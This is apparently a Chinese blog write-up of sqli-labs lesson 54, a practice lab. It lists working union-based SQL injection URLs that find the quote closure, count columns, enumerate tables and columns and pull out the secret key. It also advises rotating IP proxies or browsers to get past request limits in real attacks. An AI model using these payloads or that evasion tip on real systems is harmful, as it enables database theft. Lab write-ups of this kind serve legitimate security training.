---
title: sqli-labs lession-54 GET-Union-变化1-仅允许10次请求
date: 2018-11-21 14:08:44
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-54 GET-Union-变化1-仅允许10次请求

---

## 手注

`http://10.60.17.35:8082/Less-54/index.php?id=1+and+1=2%23`

`http://10.60.17.35:8082/Less-54/index.php?id=1'+and+1=2%23`

通过上述可以判断出是字符型,并且猜测闭合点为单引号成功。



`http://10.60.17.35:8082/Less-54/index.php?id=1'+order+by+4%23`

通过`order by`猜测字段数

![001](/img/sql/Lesson-54/001.png)

![002](/img/sql/Lesson-54/002.png)

可以发现到这里已经尝试了6次了,实战环境中还需要更换ip代理或浏览器来扩大测试。

`http://10.60.17.35:8082/Less-54/index.php?id=id=-1'+union+select+1,(database()),user()%23`

![003](/img/sql/Lesson-54/003.png)

`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`

![004](/img/sql/Lesson-54/004.png)

`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='vylco793d1'),user()%23`

![005](/img/sql/Lesson-54/005.png)

`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+GROUP_CONCAT(secret_VIY1)from challenges.vylco793d1),user()%23`

![006](/img/sql/Lesson-54/006.png)

提交通过。

![007](/img/sql/Lesson-54/007.png)



